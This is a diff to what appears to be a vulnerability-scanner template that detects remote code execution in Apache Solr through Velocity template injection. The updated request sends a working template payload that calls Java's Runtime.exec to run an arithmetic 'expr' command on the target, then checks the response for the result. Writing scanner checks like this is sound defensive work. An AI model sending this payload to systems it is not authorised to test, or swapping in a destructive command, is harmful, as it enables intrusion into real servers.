@@ -1,6 +1,7 @@
 name: poc-yaml-solr-velocity-template-rce
 set:
-  r1: randomLowercase(32)
+  r1: randomInt(2000000000, 2100000000)
+  r2: randomInt(2000000000, 2100000000)
 rules:
   - method: GET
     path: "/solr/admin/cores?wt=json"
@@ -26,10 +27,9 @@ rules:
       }
     expression: status==200
   - method: GET
-    path: "/solr/{{core}}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27echo%20{{r1}}%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
+    path: "/solr/{{core}}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27expr%20{{r1}}%20%2B%20{{r2}}%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
     follow_redirects: false
-    expression: |
-      status==200 && body.bcontains(bytes(string(r1)))
+    expression:   body.bcontains(bytes(string(r1+r2)))
 detail:
   author: Loneyer
   description: 'Apache Solr RCE via Velocity template'
